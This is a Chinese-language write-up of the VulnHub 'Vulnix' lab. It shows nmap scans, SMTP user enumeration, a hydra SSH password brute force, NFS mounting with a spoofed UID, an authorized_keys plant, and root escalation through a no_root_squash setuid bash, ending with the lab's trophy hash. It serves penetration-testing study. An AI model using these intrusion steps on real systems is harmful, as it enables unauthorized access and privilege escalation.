[(160条消息) Vulnhub靶场篇：Vulnix_夜车星繁的博客-CSDN博客](https://blog.csdn.net/weixin_44740377/article/details/106125599)

[VulnHub靶场篇3-hacklab-vulnix - labster - 博客园 (cnblogs.com)](https://www.cnblogs.com/labster/p/14332386.html)

[CTF靶场系列-Vulnix - FreeBuf网络安全行业门户](https://www.freebuf.com/column/201667.html)

# 信息搜集

## nmap扫描

1、主机存活

```bash
└─# nmap -sn 192.168.0.0/24 --min-rate=1111
```

2、端口存活扫描

```bash
└─# nmap -sS -p-  192.168.0.102 -T 5 -oA vulnix-nmap
```

3、提取端口详细扫描

```bash
└─# cat vulnix-nmap.nmap | grep open | awk -F '/' '{print $1}' | tr '\n' ','
22,25,79,110,111,143,512,513,514,993,995,2049,37572,44520,44672,46082,58051, 
```

```bash
└─# nmap -sVC -A -O -p 22,25,79,110,111,143,512,513,514,993,995,2049,37572,44520,44672,46082,58051 192.168.0.102 
```

```bash
PORT      STATE SERVICE    VERSION
22/tcp    open  ssh        OpenSSH 5.9p1 Debian 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 10cd9ea0e4e030243ebd675f754a33bf (DSA)
|   2048 bcf924072fcb76800d27a648520a243a (RSA)
|_  256 4dbb4ac118e8dad1826f58529cee345f (ECDSA)
25/tcp    open  smtp       Postfix smtpd
|_ssl-date: 2023-06-24T05:06:01+00:00; +1s from scanner time.
|_smtp-commands: vulnix, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN
| ssl-cert: Subject: commonName=vulnix
| Not valid before: 2012-09-02T17:40:12
|_Not valid after:  2022-08-31T17:40:12
79/tcp    open  finger     Linux fingerd
|_finger: No one logged on.\x0D
110/tcp   open  pop3?
|_ssl-date: 2023-06-24T05:06:01+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_pop3-capabilities: PIPELINING SASL TOP CAPA STLS RESP-CODES UIDL
111/tcp   open  rpcbind    2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  2,3,4       2049/tcp   nfs
|   100003  2,3,4       2049/tcp6  nfs
|   100003  2,3,4       2049/udp   nfs
|   100003  2,3,4       2049/udp6  nfs
|   100005  1,2,3      37572/tcp   mountd
|   100005  1,2,3      41197/udp   mountd
|   100005  1,2,3      46883/tcp6  mountd
|   100005  1,2,3      56107/udp6  mountd
|   100021  1,3,4      32897/tcp6  nlockmgr
|   100021  1,3,4      46082/tcp   nlockmgr
|   100021  1,3,4      47896/udp6  nlockmgr
|   100021  1,3,4      58518/udp   nlockmgr
|   100024  1          36546/tcp6  status
|   100024  1          44520/tcp   status
|   100024  1          47805/udp   status
|   100024  1          50506/udp6  status
|   100227  2,3         2049/tcp   nfs_acl
|   100227  2,3         2049/tcp6  nfs_acl
|   100227  2,3         2049/udp   nfs_acl
|_  100227  2,3         2049/udp6  nfs_acl
143/tcp   open  imap       Dovecot imapd
|_ssl-date: 2023-06-24T05:06:01+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_imap-capabilities: more IDLE have post-login LITERAL+ listed ID IMAP4rev1 SASL-IR ENABLE capabilities LOGIN-REFERRALS OK STARTTLS LOGINDISABLEDA0001 Pre-login
512/tcp   open  exec?
513/tcp   open  login      OpenBSD or Solaris rlogind
514/tcp   open  tcpwrapped
993/tcp   open  ssl/imap   Dovecot imapd
|_ssl-date: 2023-06-24T05:06:01+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
|_imap-capabilities: IDLE more have LITERAL+ post-login ID listed SASL-IR ENABLE AUTH=PLAINA0001 LOGIN-REFERRALS capabilities IMAP4rev1 OK Pre-login
995/tcp   open  ssl/pop3   Dovecot pop3d
|_ssl-date: 2023-06-24T05:06:01+00:00; +1s from scanner time.
|_pop3-capabilities: PIPELINING SASL(PLAIN) TOP CAPA USER RESP-CODES UIDL
| ssl-cert: Subject: commonName=vulnix/organizationName=Dovecot mail server
| Not valid before: 2012-09-02T17:40:22
|_Not valid after:  2022-09-02T17:40:22
2049/tcp  open  nfs_acl    2-3 (RPC #100227)
37572/tcp open  mountd     1-3 (RPC #100005)
44520/tcp open  status     1 (RPC #100024)
44672/tcp open  mountd     1-3 (RPC #100005)
46082/tcp open  nlockmgr   1-4 (RPC #100021)
58051/tcp open  mountd     1-3 (RPC #100005)
MAC Address: 00:0C:29:BA:BC:23 (VMware)
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Network Distance: 1 hop
Service Info: Host:  vulnix; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

4、nmap 漏洞脚本扫描

```bash
└─# nmap --script=vuln -p 22,25,79,110,111,143,512,513,514,993,995,2049,37572,44520,44672,46082,58051 192.168.0.102
```

```bash
PORT      STATE SERVICE
22/tcp    open  ssh
25/tcp    open  smtp
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Anonymous Diffie-Hellman Key Exchange MitM Vulnerability
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use anonymous
|       Diffie-Hellman key exchange only provide protection against passive
|       eavesdropping, and are vulnerable to active man-in-the-middle attacks
|       which could completely compromise the confidentiality and integrity
|       of any data exchanged over the resulting session.
|     Check results:
|       ANONYMOUS DH GROUP 1
|             Cipher Suite: TLS_DH_anon_WITH_AES_256_CBC_SHA256
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|       https://www.ietf.org/rfc/rfc2246.txt
|   
|   Transport Layer Security (TLS) Protocol DHE_EXPORT Ciphers Downgrade MitM (Logjam)
|     State: VULNERABLE
|     IDs:  BID:74733  CVE:CVE-2015-4000
|       The Transport Layer Security (TLS) protocol contains a flaw that is
|       triggered when handling Diffie-Hellman key exchanges defined with
|       the DHE_EXPORT cipher. This may allow a man-in-the-middle attacker
|       to downgrade the security of a TLS session to 512-bit export-grade
|       cryptography, which is significantly weaker, allowing the attacker
|       to more easily break the encryption and monitor or tamper with
|       the encrypted stream.
|     Disclosure date: 2015-5-19
|     Check results:
|       EXPORT-GRADE DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_EXPORT_WITH_DES40_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 512
|             Generator Length: 8
|             Public Key Length: 512
|     References:
|       https://www.securityfocus.com/bid/74733
|       https://weakdh.org
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-4000
|   
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: postfix builtin
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
| smtp-vuln-cve2010-4344: 
|_  The SMTP server is not Exim: NOT VULNERABLE
79/tcp    open  finger
110/tcp   open  pop3
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_256_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
111/tcp   open  rpcbind
143/tcp   open  imap
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_256_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
512/tcp   open  exec
513/tcp   open  login
514/tcp   open  shell
993/tcp   open  imaps
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
995/tcp   open  pop3s
| ssl-ccs-injection: 
|   VULNERABLE:
|   SSL/TLS MITM vulnerability (CCS Injection)
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL before 0.9.8za, 1.0.0 before 1.0.0m, and 1.0.1 before 1.0.1h
|       does not properly restrict processing of ChangeCipherSpec messages,
|       which allows man-in-the-middle attackers to trigger use of a zero
|       length master key in certain OpenSSL-to-OpenSSL communications, and
|       consequently hijack sessions or obtain sensitive information, via
|       a crafted TLS handshake, aka the "CCS Injection" vulnerability.
|           
|     References:
|       http://www.cvedetails.com/cve/2014-0224
|       http://www.openssl.org/news/secadv_20140605.txt
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0224
| ssl-poodle: 
|   VULNERABLE:
|   SSL POODLE information leak
|     State: VULNERABLE
|     IDs:  BID:70574  CVE:CVE-2014-3566
|           The SSL protocol 3.0, as used in OpenSSL through 1.0.1i and other
|           products, uses nondeterministic CBC padding, which makes it easier
|           for man-in-the-middle attackers to obtain cleartext data via a
|           padding-oracle attack, aka the "POODLE" issue.
|     Disclosure date: 2014-10-14
|     Check results:
|       TLS_RSA_WITH_AES_128_CBC_SHA
|     References:
|       https://www.imperialviolet.org/2014/10/14/poodle.html
|       https://www.securityfocus.com/bid/70574
|       https://www.openssl.org/~bodo/ssl-poodle.pdf
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-3566
| ssl-heartbleed: 
|   VULNERABLE:
|   The Heartbleed Bug is a serious vulnerability in the popular OpenSSL cryptographic software library. It allows for stealing information intended to be protected by SSL/TLS encryption.
|     State: VULNERABLE
|     Risk factor: High
|       OpenSSL versions 1.0.1 and 1.0.2-beta releases (including 1.0.1f and 1.0.2-beta1) of OpenSSL are affected by the Heartbleed bug. The bug allows for reading memory of systems protected by the vulnerable OpenSSL versions and could allow for disclosure of otherwise encrypted confidential information as well as the encryption keys themselves.
|           
|     References:
|       http://cvedetails.com/cve/2014-0160/
|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-0160
|_      http://www.openssl.org/news/secadv_20140407.txt 
| ssl-dh-params: 
|   VULNERABLE:
|   Diffie-Hellman Key Exchange Insufficient Group Strength
|     State: VULNERABLE
|       Transport Layer Security (TLS) services that use Diffie-Hellman groups
|       of insufficient strength, especially those using one of a few commonly
|       shared groups, may be susceptible to passive eavesdropping attacks.
|     Check results:
|       WEAK DH GROUP 1
|             Cipher Suite: TLS_DHE_RSA_WITH_3DES_EDE_CBC_SHA
|             Modulus Type: Safe prime
|             Modulus Source: Unknown/Custom-generated
|             Modulus Length: 1024
|             Generator Length: 8
|             Public Key Length: 1024
|     References:
|_      https://weakdh.org
2049/tcp  open  nfs
37572/tcp open  unknown
44520/tcp open  unknown
44672/tcp open  unknown
46082/tcp open  unknown
58051/tcp open  unknown
MAC Address: 00:0C:29:BA:BC:23 (VMware)
```

## 25端口探测

[25-smtp (flowus.cn)](https://flowus.cn/3902eac4-3ef0-49aa-9271-ec7312910dd1)

[25,465,587 - Pentesting SMTP/s - HackTricks](https://book.hacktricks.xyz/network-services-pentesting/pentesting-smtp)

从25端口入手，通过smtp可以查看到用户

连接上25端口smtp服务，使用VRFY命令发现该命令未被禁用，返回 250 说明有该用户，可以借此来枚举用户

```bash
└─# nc -nv 192.168.0.102 25                                                                                                                               1 ⨯
(UNKNOWN) [192.168.0.102] 25 (smtp) open
220 vulnix ESMTP Postfix (Ubuntu)
VRFY vulnix
252 2.0.0 vulnix
```

当然也可以直接借用工具，使用工具`smtp-user-enum`枚举用户（此处用VRFY方式）

```bash
└─# smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 192.168.0.102                                            127 ⨯
Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

 ----------------------------------------------------------
|                   Scan Information                       |
 ----------------------------------------------------------

Mode ..................... VRFY
Worker Processes ......... 5
Usernames file ........... /usr/share/metasploit-framework/data/wordlists/unix_users.txt
Target count ............. 1
Username count ........... 168
Target TCP port .......... 25
Query timeout ............ 5 secs
Target domain ............ 

######## Scan started at Sat Jun 24 01:12:15 2023 #########
192.168.0.102: backup exists
192.168.0.102: bin exists
192.168.0.102: daemon exists
192.168.0.102: games exists
192.168.0.102: gnats exists
192.168.0.102: irc exists
192.168.0.102: landscape exists
192.168.0.102: libuuid exists
192.168.0.102: list exists
192.168.0.102: lp exists
192.168.0.102: mail exists
192.168.0.102: man exists
192.168.0.102: messagebus exists
192.168.0.102: news exists
192.168.0.102: nobody exists
192.168.0.102: postfix exists
192.168.0.102: postmaster exists
192.168.0.102: proxy exists
192.168.0.102: root exists
192.168.0.102: ROOT exists
192.168.0.102: sshd exists
192.168.0.102: sync exists
192.168.0.102: sys exists
192.168.0.102: syslog exists
192.168.0.102: uucp exists
192.168.0.102: user exists
192.168.0.102: whoopsie exists
192.168.0.102: www-data exists
######## Scan completed at Sat Jun 24 01:12:15 2023 #########
28 results.
```

这里与kali本地的 /etc/passwd 比较，只需要提取 root 与 user 这两个重要的用户，然后把其作为字典 ssh 爆破，当然 root 用户就不现实（成功的话就没提权阶段了）

## 22端口ssh爆破

```bash
└─# hydra -l user -P /usr/share/wordlists/rockyou.txt -t 4 ssh://192.168.0.102
```

```bash
[22][ssh] host: 192.168.0.102   login: user   password: letmein
```

发现了用户名密码 ， `user:letmein`

# 方法打点

## user用户名ssh登录

1、登录ssh

```bash
└─# ssh user@192.168.0.102 
```

2、查看 /etc/passwd

```bash
user@vulnix:~$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
syslog:x:101:103::/home/syslog:/bin/false
messagebus:x:102:105::/var/run/dbus:/bin/false
whoopsie:x:103:106::/nonexistent:/bin/false
postfix:x:104:110::/var/spool/postfix:/bin/false
dovecot:x:105:112:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:106:65534:Dovecot login user,,,:/nonexistent:/bin/false
landscape:x:107:113::/var/lib/landscape:/bin/false
sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin
user:x:1000:1000:user,,,:/home/user:/bin/bash
vulnix:x:2008:2008::/home/vulnix:/bin/bash
statd:x:109:65534::/var/lib/nfs:/bin/false
```

## 2049端口nfs服务

之前nmap探测到靶机存在nfs服务，其作用大概是把靶机里的某个目录挂载到其它共享的地方吧

nfs是一种可分散式的网络文件系统，在一个局域网内可以共享目录和文件

[Linux下NFS配置及远程挂载 - 七彩乌云 - 博客园 (cnblogs.com)](https://www.cnblogs.com/ylnic/p/10044271.html)

提供了间接修改目录文件的可能

### 步骤

1、先查询服务器相关信息

showmount命令查询NFS服务器的相关信息，可以得知需要挂载的是vulnix的home目录
[Linux系统如何使用showmount命令-系统之家 (xitongzhijia.net)](http://www.xitongzhijia.net/xtjc/20150331/43468.html)

```bash
└─# showmount -e 192.168.0.102
Export list for 192.168.0.102:
/home/vulnix *
```

由此可见是把 vulnix 用户的根目录挂载出去

2、 挂载该服务器的共享文件到本地上
[Linux挂载命令mount用法及参数详解 | 《Linux就该这么学》 (linuxprobe.com)](https://www.linuxprobe.com/mount-detail-parameters.html)

访问该目录，发现访问不了，是要和vulnix有相同ID才可以访问

```bash
└─# mount -t nfs 192.168.0.102:/home/vulnix /tmp/nfs                                                                                                                                        
└─# cd /tmp/nfs
cd: permission denied: /tmp/nfs
```

3、之前 user 用户 ssh 登录时看到了 /etc/passwd

```bash
vulnix:x:2008:2008::/home/vulnix:/bin/bash
```

查看到vulnix的id为2008，于是本地创建 id 为 2008 的 vulnix 用户，密码也为 vulnix

```bash
┌──(root💀kali)-[~/vulnix]
└─# useradd -u 2008 vulnix                                                                                                                                                              
┌──(root💀kali)-[~/vulnix]
└─# passwd vulnix
New password: 
Retype new password: 
passwd: password updated successfully
```

这时候用本地的 vulnix 用户便可以进入挂载的 /tmp/nfs 目录了，接下来的做法，可以用 ssh 公私钥登录 vulnix

4、公私钥ssh远程登录 vulnix 用户

切换用户进入本地的 vulnix

```bash
└─# su vulnix
$ cd /tmp/nfs
$ ls
$ ls -al
total 28
drwxr-x---  2 nobody nogroup  4096 Sep  2  2012 .
drwxrwxrwt 12 root   root    12288 Jun 24 01:45 ..
-rw-r--r--  1 nobody nogroup   220 Apr  3  2012 .bash_logout
-rw-r--r--  1 nobody nogroup  3486 Apr  3  2012 .bashrc
-rw-r--r--  1 nobody nogroup   675 Apr  3  2012 .profile
```

kali 本地生成公钥私钥

```bash
└─# ssh-keygen -f vulnix
└─# cp vulnix.pub /tmp/authorized_keys 
```

复制到 挂载后的 .ssh 目录

```bash
vulnix@kali:/tmp/nfs$ cp /tmp/authorized_keys authorized_keys
vulnix@kali:/tmp/nfs$ cp authorized_keys .ssh/authorized_keys
```

kali ssh登录

```bash
└─# ssh -i vulnix vulnix@192.168.0.102
```

我这里失败了，linux公私钥的操作应该没问题（远程服务器上测试成功），挂载也没问题，就是失败了

<img src=".\图片\Snipaste_2023-06-24_15-45-30.png" alt="Snipaste_2023-06-24_15-45-30" style="zoom:80%;" />

<img src=".\图片\Snipaste_2023-06-24_15-47-20.png" alt="Snipaste_2023-06-24_15-47-20" style="zoom:80%;" />

# 权限提升

## 通过bash提权

1、修改nfs文件任意用户都可访问，在vulnix用户下修改`/etc/exports`文件
[sudoedit 命令 - 知乎 (zhihu.com)](https://zhuanlan.zhihu.com/p/75557091)

```
sudoedit /etc/exports
将root_squash修改成no_root_squash
```

2、通过vulnix用户拷贝一份bash到挂载目录处

```
vulnix@vulnix:~$ cp /bin/bash
```

3、重启靶机，重新挂载该目录

```
umount /tmp/nfs
mount -t nfs 192.168.31.218:/home/vulnix /tmp/nfs
```

4、以本地的root权限进行访问挂载目录的nfs文件夹，修改该bash的权限
使得vulnix可以直接执行

```
chmod 4777 bash
chown root.root bash

root@HHH:tmp/nfs# ls -al
总用量 932
drwxr-x--- 4 vulnix vulnix   4096 1月  26 16:28 .
drwxr-xr-x 4 hhh    hhh      4096 1月  26 16:20 ..
-rwsrwxrwx 1 root   root   920788 1月  26 16:27 bash
-rw------- 1 vulnix vulnix    119 1月  26 16:28 .bash_history
-rw-r--r-- 1 vulnix vulnix    220 4月   3  2012 .bash_logout
-rw-r--r-- 1 vulnix vulnix   3486 4月   3  2012 .bashrc
drwx------ 2 vulnix vulnix   4096 1月  26 05:21 .cache
-rw-r--r-- 1 vulnix vulnix    675 4月   3  2012 .profile
drwxr-xr-x 2 vulnix vulnix   4096 1月  26 05:20 .ssh
```

5、*在用户vulnix中执行bash

```
./bash -p
```

> 不是很清楚-p是什么意思

6、前往root目录查看文件即可

## 挂载/root目录到nfs服务器上

1、挂载/root到nfs服务器上

```
vulnix@vulnix:~$ sudoedit /etc/exports
添加一行
/root    *(no_root_squash,insecure,rw)
```

2、重启靶机，挂载/root目录

```
mount -t nfs 192.168.31.218:/root /tmp/nfs/
```

3、本地访问

```
root@HHH:tmp# cd nfs
root@HHH:tmp/nfs# ls
trophy.txt
root@HHH:tmp/nfs# cat trophy.txt 
cc614640424f5bd60ce5d5264899c3be
```

# 总结

1. smtp服务，用户枚举
2. nfs文件系统（共享）
3. 挂载服务器到本地
4. 创建指定id号的用户
5. 公钥私钥登录、ssh
6. sudoedit使用
7. 修改权限chmod、chown
